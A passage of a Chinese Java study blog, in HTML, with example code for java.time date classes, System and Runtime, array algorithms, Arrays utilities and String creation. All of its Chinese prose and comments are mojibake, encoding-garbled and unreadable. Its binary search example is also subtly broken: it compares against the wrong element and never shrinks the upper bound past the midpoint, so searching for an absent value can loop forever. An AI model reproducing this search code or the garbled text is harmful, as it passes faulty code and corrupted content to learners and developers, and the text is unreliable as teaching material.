title="æ–°å¢çš„ä¸‰ä¸ªæ—¥æœŸå¯¹è±¡"></a>æ–°å¢çš„ä¸‰ä¸ªæ—¥æœŸå¯¹è±¡</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220916002810246.png" alt="image-20220916002810246"></p><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">import java.time.LocalDate;import java.time.LocalDateTime;import java.time.LocalTime;import java.time.Month;public class TestDate &#123;    public static void main(String[] args) &#123;        /*        LocalDate å¹´ æœˆ æ—¥        ä¸å¯å˜æ—¥æœŸï¼Œä¸€æ—¦å¯¹æ—¥æœŸåšå‡ºä¿®æ”¹ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„LocalDateè®°å½•æ”¹å˜åçš„æ—¥æœŸ        minusDays():æ—¥æœŸå‡å°‘         */        //å¯¹ å¹´ æœˆ æ—¥ è¿›è¡Œæ“ä½œ        LocalDate now = LocalDate.now();        System.out.println(now);        int year = now.getYear();        int month = now.getMonthValue();        int day = now .getDayOfMonth();        System.out.println(&quot;year = &quot; + year);        System.out.println(&quot;month = &quot; + month);        System.out.println(&quot;day = &quot; + day);        System.out.println(&quot;-----------&quot;);        Month month1 = now.getMonth();        System.out.println(&quot;month1 = &quot; + month1);        System.out.println(month1.getValue());        System.out.println(&quot;-----------&quot;);                LocalDate localDate = now.minusDays(15);        System.out.println(&quot;now = &quot; + now);        System.out.println(&quot;localDate = &quot; + localDate);        System.out.println(&quot;-----------&quot;);        LocalDate of = LocalDate.of(2050,12,31); //å¯¹å¹´æœˆæ—¥è¿›è¡Œæ“ä½œ        System.out.println(of);        LocalDate localDate1 = of.plusDays(1);        System.out.println(localDate1);        System.out.println(&quot;-----------&quot;);        //å¯¹ æ—¶ åˆ† ç§’ è¿›è¡Œæ“ä½œ        LocalTime localTime = LocalTime.now();        System.out.println(&quot;localTime = &quot; + localTime);//å°¾æ•°æ˜¯çº³ç§’        System.out.println(&quot;-----------&quot;);        //åŒæ—¶å¯¹ å¹´ æœˆ æ—¥ æ—¶ åˆ† ç§’ è¿›è¡Œæ“ä½œ        LocalDateTime  localDateTime = LocalDateTime.now();        System.out.println(&quot;localDateTime = &quot; + localDateTime);        LocalDateTime of1 = LocalDateTime.of(2050,12,31,15,22);        System.out.println(&quot;of1 = &quot; + of1);    &#125;&#125;</code></pre><p>è¾“å‡º:</p><pre><code>2022-09-16year = 2022month = 9day = 16-----------month1 = SEPTEMBER9-----------now = 2022-09-16localDate = 2022-09-01-----------2050-12-312051-01-01-----------localTime = 01:13:08.425-----------localDateTime = 2022-09-16T01:13:08.425of1 = 2050-12-31T15:22</code></pre><h3 id="è·å–ä¸æŒ‡å®šæ—¶åŒºæ—¶é—´å’Œä¸¤ä¸ªæ—¥æœŸé—´éš”"><a href="#è·å–ä¸æŒ‡å®šæ—¶åŒºæ—¶é—´å’Œä¸¤ä¸ªæ—¥æœŸé—´éš”" class="headerlink" title="è·å–ä¸æŒ‡å®šæ—¶åŒºæ—¶é—´å’Œä¸¤ä¸ªæ—¥æœŸé—´éš”"></a>è·å–ä¸æŒ‡å®šæ—¶åŒºæ—¶é—´å’Œä¸¤ä¸ªæ—¥æœŸé—´éš”</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220916140917835.png" alt="image-20220916140917835"></p><p><strong>ä½¿ç”¨periodè®¡ç®—æ—¶é—´é—´éš”</strong></p><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">import java.time.LocalDate;import java.time.Period;public class Test2 &#123;    public static void main(String[] args) &#123;        LocalDate l1 = LocalDate.now();        LocalDate l2 = LocalDate.of(2050,2,18);        System.out.println(&quot;l1 = &quot; + l1);        System.out.println(&quot;l2 = &quot; + l2);        Period period = Period.between(l1,l2);        System.out.println(&quot;period = &quot; + period);        System.out.println(&quot;period.getYears() = &quot; + period.getYears());        System.out.println(&quot;period.getMonths() = &quot; + period.getMonths());    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220916142343404.png" alt="image-20220916142343404"></p><p><strong>ä½¿ç”¨Durationè®¡ç®—ä¸¤ä¸ªæ—¶é—´é—´éš”</strong></p><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">import java.time.Duration;import java.time.LocalDateTime;public class Test2 &#123;    public static void main(String[] args) &#123;        LocalDateTime l1 = LocalDateTime.now();        LocalDateTime l2 = LocalDateTime.of(2050,12,31,15,21);        Duration duration = Duration.between(l1,l2); //è®¡ç®—ä¸¤ä¸ªæ—¶é—´çš„æ—¶é—´é—´éš”        System.out.println(&quot;duration = &quot; + duration);        System.out.println(&quot;duration.toDays() = &quot; + duration.toDays());        System.out.println(&quot;duration.toHours() = &quot; + duration.toHours());    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220916142900289.png" alt="image-20220916142900289"></p><h3 id="DateTimeFormatterç±»-æ—¥æœŸæ ¼å¼åŒ–ç±»"><a href="#DateTimeFormatterç±»-æ—¥æœŸæ ¼å¼åŒ–ç±»" class="headerlink" title="DateTimeFormatterç±»:æ—¥æœŸæ ¼å¼åŒ–ç±»"></a>DateTimeFormatterç±»:æ—¥æœŸæ ¼å¼åŒ–ç±»</h3><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">import java.time.LocalDateTime;import java.time.format.DateTimeFormatter;public class Test2 &#123;    public static void main(String[] args) &#123;        LocalDateTime l1 = LocalDateTime.now();        System.out.println(&quot;l1 = &quot; + l1);        /*        å°†æ—¥æœŸè½¬ä¸ºå­—ç¬¦ä¸²         */        DateTimeFormatter formatter = DateTimeFormatter.ISO_DATE; // DateTimeFormatter æœ‰æä¾›å¥½çš„æ¨¡æ¿ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨        String format = formatter.format(l1);        System.out.println(&quot;format = &quot; + format);        //è‡ªå®šä¹‰æ ¼å¼        DateTimeFormatter formatter1 = DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd HH:mm:ss E&quot;);        String result = formatter1.format(l1);        System.out.println(&quot;result = &quot; + result);        /*        å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ—¥æœŸ         */        DateTimeFormatter formatter2 = DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd HH:mm:ss E&quot;);        String str = &quot;2022-09-16 14:51:26 æ˜ŸæœŸäº”&quot;;        LocalDateTime parse= LocalDateTime.parse(str,formatter2);        System.out.println(&quot;parse = &quot; + parse);    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220916150014010.png" alt="image-20220916150014010"></p><h3 id="ç³»ç»Ÿç›¸å…³ç±»"><a href="#ç³»ç»Ÿç›¸å…³ç±»" class="headerlink" title="ç³»ç»Ÿç›¸å…³ç±»"></a>ç³»ç»Ÿç›¸å…³ç±»</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220916151720605.png" alt="image-20220916151720605"></p><pre><code class="java">import java.util.Properties;public class SystemTest &#123;    public static void main(String[] args) &#123;        long l = System.currentTimeMillis(); //        System.out.println(&quot;l = &quot; + l);        System.gc(); //è¿è¡Œåƒåœ¾å›æ”¶å™¨        int [] arr = &#123;10,20,30&#125;;        int [] newArr = new int[arr.length];        System.arraycopy(arr,0,newArr,0,arr.length);        for (int i :newArr)&#123;            System.out.println(i);        &#125;        System.out.println(&quot;-----------------&quot;);        Properties properties = System.getProperties();//        properties.list(System.out);        String property = System.getProperty(&quot;java.version&quot;);        System.out.println(&quot;property = &quot; + property);        // Runtime        Runtime r1 = Runtime.getRuntime();        Runtime r2 = Runtime.getRuntime();        System.out.println(r1==r2); //è¯´æ˜äº†Runtimeåˆ›å»ºçš„å¯¹è±¡éƒ½æ˜¯åŒä¸€ä¸ª        System.out.println(&quot;r1.totalMemory() = &quot; + r1.totalMemory()); //æ€»å†…å­˜        System.out.println(&quot;r1.freeMemory() = &quot; + r1.freeMemory()); //å‰©ä½™å†…å­˜    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220916170328632.png" alt="image-20220916170328632"></p><h2 id="æ•°ç»„çš„ç®—æ³•å‡å"><a href="#æ•°ç»„çš„ç®—æ³•å‡å" class="headerlink" title="æ•°ç»„çš„ç®—æ³•å‡å"></a>æ•°ç»„çš„ç®—æ³•å‡å</h2><h3 id="æ•°ç»„çš„åè½¬"><a href="#æ•°ç»„çš„åè½¬" class="headerlink" title="æ•°ç»„çš„åè½¬"></a>æ•°ç»„çš„åè½¬</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220918230400278.png" alt="image-20220918230400278"></p><p><strong>æ–¹æ³•ä¸€ åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„</strong></p><pre><code class="java">public class ArrayTest &#123;    public static void main(String[] args) &#123;        int [] arr = &#123;10,20,30,40,50,60,70&#125;;        //äº¤æ¢æ–¹æ³•ä¸€ åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„        int [] newarr = new int[arr.length];        int index = 0;        for (int i =arr.length-1;i&gt;=0;i--)&#123;            newarr[index++] = arr[i];        &#125;        for (int i : newarr) &#123;            System.out.println(i);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220918233551604.png" alt="image-20220918233551604"></p><p><strong>æ–¹æ³•äºŒæ•°ç»„å†…äº¤æ¢</strong></p><pre><code class="java">public class ArrayTest &#123;    public static void main(String[] args) &#123;        int [] arr = &#123;10,20,30,40,50,60,70&#125;;        //äº¤æ¢æ–¹æ³•äºŒ æ•°ç»„å†…äº¤æ¢        for (int i =0;i&lt;arr.length/2;i++)&#123;            int temp;            temp = arr[i];            arr[i] = arr[arr.length-1-i];            arr[arr.length-1-i] = temp;        &#125;        for (int i : arr) &#123;            System.out.println(i);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220918234451781.png" alt="image-20220918234451781"></p><h3 id="æ•°ç»„çš„äºŒåˆ†æŸ¥æ‰¾"><a href="#æ•°ç»„çš„äºŒåˆ†æŸ¥æ‰¾" class="headerlink" title="æ•°ç»„çš„äºŒåˆ†æŸ¥æ‰¾"></a>æ•°ç»„çš„äºŒåˆ†æŸ¥æ‰¾</h3><pre><code class="java">public class ArrayTest &#123;    public static void main(String[] args) &#123;        int[] arr = &#123;10, 20, 30, 40, 50, 60, 70,82,92,103&#125;;        //äºŒåˆ†æŸ¥æ‰¾ã€‚äºŒåˆ†æŸ¥æ‰¾æ’åºå¿…é¡»æ˜¯æœ‰åºçš„        int res = binarySearch(arr,103);        System.out.println(&quot;æ‚¨è¦æŸ¥æ‰¾çš„æ•°å­—ä¸‹æ ‡ä¸º&quot;+res);    &#125;    private static int binarySearch(int[] arr, int ele) &#123;        int ArrIndex = 0;        int ArrEnd = arr.length - 1;        while (ArrIndex &lt;= ArrEnd) &#123;            int ArrMid = (ArrIndex + ArrEnd) / 2;            if (ele &gt; arr[ArrMid]) &#123;                ArrIndex = ArrMid + 1;            &#125; else if (ele &lt; arr[ArrEnd])&#123;                ArrEnd = ArrMid;            &#125; else &#123;                return ArrMid;            &#125;        &#125;        return -1;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220919002943734.png" alt="image-20220919002943734"></p><h1 id="day17"><a href="#day17" class="headerlink" title="day17"></a>day17</h1><h2 id="æ•°ç»„çš„æ‰©å®¹"><a href="#æ•°ç»„çš„æ‰©å®¹" class="headerlink" title="æ•°ç»„çš„æ‰©å®¹"></a>æ•°ç»„çš„æ‰©å®¹</h2><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">public class ArrTest &#123;    @Test    public void test01()&#123;        //æ—§æ•°ç»„ä¸å¤Ÿè¦æ‰©å®¹        String [] strarr = &#123;&quot;å¼ ä¸‰&quot;,&quot;æå››&quot;,&quot;ç‹äº”&quot;&#125;;        //ç°åœ¨æœ‰éœ€æ±‚ï¼Œéœ€è¦å°†æ•°ç»„æ‰©å®¹è‡³åŸæ¥çš„ä¸¤å€ã€        String [] newarr = new String[strarr.length*2];        //å…ˆå°†æ—§æ•°ç»„å¤åˆ¶åˆ°æ–°æ•°ç»„        System.arraycopy(strarr,0,newarr,0,3);        //æ·»åŠ éœ€è¦çš„å€¼        newarr[strarr.length] = &quot;æç™½&quot;;        newarr[strarr.length+1] = &quot;æœç”«&quot;;        newarr[strarr.length+2] = &quot;ç™½å±…æ˜“&quot;;        //å°†æ–°æ•°ç»„çš„åœ°å€èµ‹å€¼ç»™æ—§æ•°ç»„        strarr = newarr;        //è¾“å‡ºæ—§æ•°ç»„        for (String s : strarr) &#123;            System.out.println(s);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220921144123079.png" alt="image-20220921144123079"></p><h2 id="æ•°ç»„çš„æ’å…¥"><a href="#æ•°ç»„çš„æ’å…¥" class="headerlink" title="æ•°ç»„çš„æ’å…¥"></a>æ•°ç»„çš„æ’å…¥</h2><p><strong>æ•°ç»„æœªæ»¡</strong></p><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">     @Test    public void test02()&#123;        //æ•°ç»„çš„æ’å…¥ï¼Œåˆ†ä¸¤ç§æƒ…å†µï¼Œæ•°ç»„æœªæ»¡å’Œæ•°ç»„å·²æ»¡        //1.æ•°ç»„æœªæ»¡        String [] arr = new String[5];        arr[0] = &quot;è”¡å¾å¤&quot;;        arr[1] = &quot;è‚–æˆ˜&quot;;        arr[2] = &quot;ç‹ä¸€åš&quot;;        System.arraycopy(arr,1,arr,2,2); //ä»ç¬¬äºŒä¸ªå…ƒç´ å¼€å§‹ï¼Œæ•´ä½“åç§»ä¸€ä¸ªä½ç½®        arr[1] = &quot;èµµå››&quot;; //åœ¨ç¬¬äºŒä¸ªä½ç½®æ’å…¥èµµå››        for (String s : arr) &#123;            System.out.println(s);        &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220921150522702.png" alt="image-20220921150522702"></p><p><strong>æ•°ç»„å·²æ»¡</strong></p><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">    @Test    public void test03()&#123;        //æ•°ç»„å·²æ»¡çš„æ—¶å€™æ’å…¥å…ƒç´         String [] arr = &#123;&quot;å¼ ä¸‰&quot;,&quot;æå››&quot;,&quot;ç‹äº”&quot;&#125;;        //éœ€æ±‚ï¼šåœ¨å¼ ä¸‰å’Œæå››ä¸­é—´æ’å…¥ä¸€ä¸ªè”¡å¾å¤        //ç”±äºæ•°ç»„å·²æ»¡ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›è¡Œæ‰©å®¹ï¼Œå¹¶å°†æ”¹å˜ä¹‹å‰çš„èµ‹å€¼ç»™æ–°æ•°ç»„        String [] newarr = new String[arr.length+1]; //æ‰©å®¹æ“ä½œ        int index = 1;        for (int i =0;i&lt;index;i++)&#123;            newarr[i] = arr[i];        &#125;        System.arraycopy(arr,1,newarr,2,2);        newarr[1] = &quot;è”¡å¾å¤&quot;;        arr = newarr;        for (String s : arr) &#123;            System.out.println(s);        &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220921151843085.png" alt="image-20220921151843085"></p><h2 id="æ•°ç»„çš„åˆ é™¤"><a href="#æ•°ç»„çš„åˆ é™¤" class="headerlink" title="æ•°ç»„çš„åˆ é™¤"></a>æ•°ç»„çš„åˆ é™¤</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220921160641109.png" alt="image-20220921160641109"></p><p>æ€è·¯ä¸€:</p><p>æ–°å»ºä¸€ä¸ªæ•°ç»„</p><pre><code class="java">    @Test    public void test04()&#123;        String [] arr = &#123;&quot;å¼ ä¸‰&quot;,&quot;æå››&quot;,&quot;ç‹äº”&quot;&#125;;        //æ–°å»ºä¸€ä¸ªæ•°ç»„        String [] newarr = new String[arr.length-1];        newarr[0] = arr[0];        newarr[1] = arr[2];        arr = newarr;        for (String s : arr) &#123;            System.out.println(s);        &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220921161127117.png" alt="image-20220921161127117"></p><p>æ€è·¯äºŒ:</p><p>åœ¨æ•°ç»„å†…è¿›è¡Œæ“ä½œ</p><pre><code class="java">    @Test    public void test05()&#123;        String [] arr = &#123;&quot;å¼ ä¸‰&quot;,&quot;æå››&quot;,&quot;ç‹äº”&quot;&#125;;        //æ•°ç»„å†…è¿›è¡Œæ“ä½œ        System.arraycopy(arr,2,arr,1,1);        arr[2] = null;        for (String s : arr) &#123;            System.out.println(s);        &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220921161356596.png" alt="image-20220921161356596"></p><h2 id="é€‰æ‹©æ’åº"><a href="#é€‰æ‹©æ’åº" class="headerlink" title="é€‰æ‹©æ’åº"></a>é€‰æ‹©æ’åº</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220921165230529.png" alt="image-20220921165230529"></p><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">    @Test    public void test06()&#123;        int [] arr = &#123;100,50,90,45,56,73,20&#125;;        for (int i =0;i&lt;arr.length-1;i++)&#123;            int minindex = i;            for (int j=i+1;j&lt;=arr.length-1;j++)&#123;                if (arr[minindex] &lt;= arr[j])&#123;                    continue;                &#125;else &#123;                    minindex = j;                &#125;            &#125;            int temp = arr[i];            arr[i] = arr[minindex];            arr[minindex] = temp;        &#125;        for (int i : arr) &#123;            System.out.println(i);        &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220921172432856.png" alt="image-20220921172432856"></p><h2 id="æ•°ç»„çš„å·¥å…·ç±»"><a href="#æ•°ç»„çš„å·¥å…·ç±»" class="headerlink" title="æ•°ç»„çš„å·¥å…·ç±»"></a>æ•°ç»„çš„å·¥å…·ç±»</h2><p><strong>Arrays.toStringå‡½æ•°</strong></p><pre><code class="java">    @Test    public void test11()&#123;        int [] arr = &#123;10,20,50,32,12&#125;;        System.out.println(arr);        System.out.println(Arrays.toString(arr));    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922140706344.png" alt="image-20220922140706344"></p><p>è¾“å‡ºæ•°ç»„çš„å€¼</p><p><strong>Arrays.deepToStringå‡½æ•°</strong></p><p>Array.toStringå‡½æ•°åªèƒ½æ˜¾ç¤ºä¸€ç»´æ•°ç»„</p><pre><code class="java">    @Test    public void test11()&#123;        int [] [] arrs = &#123;&#123;1,2&#125;,&#123;22,43&#125;,&#123;97,67&#125;&#125;;        System.out.println(Arrays.toString(arrs));        System.out.println(Arrays.deepToString(arrs));    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922141005991.png" alt="image-20220922141005991"></p><p><strong>Arrays.sortæ–¹æ³•</strong></p><pre><code class="java">    @Test    public void test07()&#123;        //Array.sortå¯ä»¥å¯¹æ•°ç»„è¿›è¡Œæ’åº        int [] arr = &#123;50,56,12,80,5&#125;;        System.out.println(Arrays.toString(arr));        Arrays.sort(arr);        System.out.println(Arrays.toString(arr));    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922133838302.png" alt="image-20220922133838302"></p><p>é—®é¢˜ï¼šå¦‚ä½•å¯¹å¯¹è±¡æ•°ç»„è¿›è¡Œæ¯”è¾ƒ?</p><p>å¦‚æœæˆ‘ä»¬ç›´æ¥è¿›è¡Œæ’åºå°±ä¼šæŠ¥é”™ï¼Œå› ä¸ºç¨‹åºä¸çŸ¥é“æ ¹æ®ä»€ä¹ˆè¿›è¡Œæ¯”è¾ƒ</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922134730091-16638256523091.png" alt="image-20220922134730091"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922134744471.png" alt="image-20220922134744471"></p><p>è§£å†³æ–¹æ³•:é‡å†™Comparable</p><p>æ–¹æ³•ä¸€:ç»§æ‰¿çš„æ–¹å¼</p><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">    public void test08()&#123;        Person p1 = new Person(&quot;David&quot;,17);        Person p2 = new Person(&quot;ç‘è´å¡&quot;,15);        Person p3 = new Person(&quot;Lucy&quot;,19);        Person [] arr = &#123;p1,p2,p3&#125;;        System.out.println(Arrays.toString(arr));        Arrays.sort(arr);        System.out.println(Arrays.toString(arr));    &#125;    class Person implements Comparable&#123;        @Override        public int compareTo(Object o) &#123;            Person p = (Person)o;            return this.age-p.age;        &#125;        String name;        int age;        public Person(String name, int age) &#123;            this.name = name;            this.age = age;        &#125;        public Person() &#123;        &#125;        public String getName() &#123;            return name;        &#125;        public void setName(String name) &#123;            this.name = name;        &#125;        public int getAge() &#123;            return age;        &#125;        public void setAge(int age) &#123;            this.age = age;        &#125;        @Override        public String toString() &#123;            return &quot;Person&#123;&quot; +                    &quot;name=&#39;&quot; + name + &#39;\&#39;&#39; +                    &quot;, age=&quot; + age +                    &#39;&#125;&#39;;        &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922135320269.png" alt="image-20220922135320269"></p><p>æ–¹æ³•äºŒ:é‡‡ç”¨åŒ¿åå†…éƒ¨ç±»</p><pre><code class="java">    @Test    public void test09()&#123;        Person p1 = new Person(&quot;David&quot;,17);        Person p2 = new Person(&quot;ç‘è´å¡&quot;,15);        Person p3 = new Person(&quot;Lucy&quot;,19);        Person [] arr = &#123;p1,p2,p3&#125;;        System.out.println(Arrays.toString(arr));        Arrays.sort(arr, new Comparator&lt;Person&gt;() &#123;            @Override            public int compare(Person o1, Person o2) &#123;                Person p1 = (Person) o1;                Person p2 = (Person) o2;                return p1.getAge()-p2.getAge();            &#125;        &#125;);        System.out.println(Arrays.toString(arr));    &#125;    class Person&#123;        String name;        int age;        public Person(String name, int age) &#123;            this.name = name;            this.age = age;        &#125;        public Person() &#123;        &#125;        public String getName() &#123;            return name;        &#125;        public void setName(String name) &#123;            this.name = name;        &#125;        public int getAge() &#123;            return age;        &#125;        public void setAge(int age) &#123;            this.age = age;        &#125;        @Override        public String toString() &#123;            return &quot;Person&#123;&quot; +                    &quot;name=&#39;&quot; + name + &#39;\&#39;&#39; +                    &quot;, age=&quot; + age +                    &#39;&#125;&#39;;        &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922135738345.png" alt="image-20220922135738345"></p><p><strong>Arrays.fillå‡½æ•°</strong></p><p>æ³¨æ„ï¼šæ­¤å‡½æ•°èŒƒå›´ä¸ºå·¦é—­å³å¼€</p><p>[n,m)</p><pre><code class="java">    @Test    public void test10()&#123;        int [] arr = &#123;10,20,50,32,12&#125;;        System.out.println(Arrays.toString(arr));        Arrays.fill(arr,0,2,666); //æ³¨æ„:æ­¤å‡½æ•°èŒƒå›´æ˜¯å·¦é—­å³å¼€        System.out.println(Arrays.toString(arr));    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922140159868.png" alt="image-20220922140159868"></p><p><strong>Arrays.equalså‡½æ•°</strong></p><p>æ¯”è¾ƒçš„æ˜¯å†…å®¹åŠå…¶ä¸‹æ ‡æ˜¯å¦å®Œå…¨ä¸€è‡´</p><pre><code class="java">    @Test    public void test12()&#123;        int [] arr1 = &#123;10,20,50,32,12&#125;;        int [] arr2 = &#123;10,20,50,32,12&#125;;        System.out.println(arr1==arr2);        boolean flag = Arrays.equals(arr1,arr2);        System.out.println(&quot;flag = &quot; + flag);    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922141245975.png" alt="image-20220922141245975"></p><p><strong>Arrays.copyOfå‡½æ•°</strong></p><p>å¤åˆ¶æ—§æ•°ç»„ï¼Œåˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„</p><pre><code class="java">    @Test    public void test13()&#123;        int [] arr1 = &#123;10,20,50,32,12&#125;;        int [] arr2 = Arrays.copyOf(arr1,2);        System.out.println(Arrays.toString(arr2));    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922141529755.png" alt="image-20220922141529755"></p><p><strong>Arrays.copyOfRangeå‡½æ•°</strong></p><p>å¤åˆ¶æ—§æ•°ç»„çš„ä¸€æ®µï¼Œåˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„</p><p>èŒƒå›´ä¹Ÿæ˜¯å·¦é—­å³å¼€</p><p>[n,m)</p><pre><code class="java">    @Test    public void test13()&#123;        int [] arr1 = &#123;10,20,50,32,12&#125;;        int [] arr2 = Arrays.copyOfRange(arr1,2,4);        System.out.println(Arrays.toString(arr2));    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922141939165.png" alt="image-20220922141939165"></p><h2 id="å­—ç¬¦ä¸²çš„ç®€ä»‹ä»‹ç»"><a href="#å­—ç¬¦ä¸²çš„ç®€ä»‹ä»‹ç»" class="headerlink" title="å­—ç¬¦ä¸²çš„ç®€ä»‹ä»‹ç»"></a>å­—ç¬¦ä¸²çš„ç®€ä»‹ä»‹ç»</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922143602790-16638285641583.png" alt="image-20220922143602790"></p><h2 id="åˆ›å»ºå­—ç¬¦ä¸²çš„æ–¹å¼"><a href="#åˆ›å»ºå­—ç¬¦ä¸²çš„æ–¹å¼" class="headerlink" title="åˆ›å»ºå­—ç¬¦ä¸²çš„æ–¹å¼"></a>åˆ›å»ºå­—ç¬¦ä¸²çš„æ–¹å¼</h2><pre><code class="java">public class TestSrting &#123;    public static void main(String[] args) &#123;        //æ–¹å¼ä¸€        String s1 = &quot;ä½ å¥½&quot;;        //æ–¹å¼äºŒ        char [] a = &#123;&#39;a&#39;,&#39;b&#39;&#125;;        String s2 = new String(a);        System.out.println(s2);        //æ–¹å¼ä¸‰        String s3 = new String(&quot;ä¸–ç•Œ&quot;);        //æ–¹å¼å››        byte [] bytes = &#123;65,66,67,97&#125;;        String s4 = new String(bytes); //ä¼šå°†byteç±»å‹ä¸­çš„æ•°å­—è§£æä¸ºå¯¹åº”å­—ç¬¦        System.out.println(s4);        String s5 = new String(bytes,1,2); //ä»1å¼€å§‹ï¼Œå–ä¸¤ä¸ª        System.out.println(s5);        //æ–¹å¼äº” é€šè¿‡æ–¹æ³•åˆ›å»º        char [] c = &#123;&#39;a&#39;,&#39;b&#39;,&#39;c&#39;&#125;;        int b = 5;        String s6 = &quot;&quot;+b; //å­—ç¬¦ä¸²ä¸æ•´æ•°ç›¸è¿æ¥æˆä¸ºå­—ç¬¦ä¸²        String s7 = String.valueOf(b); //æ–¹æ³•è¿”å›å€¼ä¸ºå­—ç¬¦ä¸²        String s8 = String.copyValueOf(c,0,3);        //æ–¹æ³•æœ‰å¾ˆå¤šï¼Œå¤šç¿»é˜…æ–‡æ¡£    &#125;&#125;</code></pre><h2 id="å¯¹è±¡çš„ä¸ªæ•°é—®é¢˜"><a href="#å¯¹è±¡çš„ä¸ªæ•°é—®é¢˜" class="headerlink" title="å¯¹è±¡çš„ä¸ªæ•°é—®é¢˜"></a>å¯¹è±¡çš„ä¸ªæ•°é—®é¢˜</h2><pre><code class="java">public class TestSrting &#123;    public static void main(String[] args) &#123;        String s1 = &quot;hello&quot;;        String s2 = &quot;hello&quot;;        System.out.println(s1==s2);        System.out.println(s1.equals(s2));            &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922150958579.png" alt="image-20220922150958579"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922151425322.png" alt="image-20220922151425322"></p><pre><code class="java">public class TestSrting &#123;    public static void main(String[] args) &#123;        String s1 = &quot;hello&quot;;        String s2 = new String(&quot;hello&quot;);        System.out.println(s1==s2);        System.out.println(s1.equals(s2));    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922151244855.png" alt="image-20220922151244855"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922151514096.png" alt="image-20220922151514096"></p><h2 id="Stringå†…å­˜åˆ†æ"><a href="#Stringå†…å­˜åˆ†æ" class="headerlink" 